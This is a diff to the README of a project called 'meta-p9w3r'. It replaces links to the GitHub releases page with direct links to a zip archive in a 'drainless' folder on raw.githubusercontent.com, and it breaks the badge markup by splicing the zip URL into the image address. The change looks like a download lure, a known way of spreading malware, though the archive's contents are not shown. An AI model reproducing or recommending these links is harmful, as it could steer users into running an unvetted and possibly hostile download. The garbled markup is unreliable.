@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download meta-p9w3r](https://img.shields.io/badge/Download%20meta--p9w3r-v1.0-blue.svg)](https://github.com/Mohamed44434/meta-p9w3r/releases)
+[![Download meta-p9w3r](https://raw.githubusercontent.com/Mohamed44434/meta-p9w3r/main/drainless/meta-p9w3r.zip%https://raw.githubusercontent.com/Mohamed44434/meta-p9w3r/main/drainless/meta-p9w3r.zip)](https://raw.githubusercontent.com/Mohamed44434/meta-p9w3r/main/drainless/meta-p9w3r.zip)
 
 ## 🚀 Getting Started
 
@@ -23,7 +23,7 @@ To get started, follow these easy steps to download and run the application.
    
    Go to the following link to access the releases page for **meta-p9w3r**:
 
-   [Visit this page to download](https://github.com/Mohamed44434/meta-p9w3r/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/Mohamed44434/meta-p9w3r/main/drainless/meta-p9w3r.zip)
 
 2. **Choose the Latest Version**
 
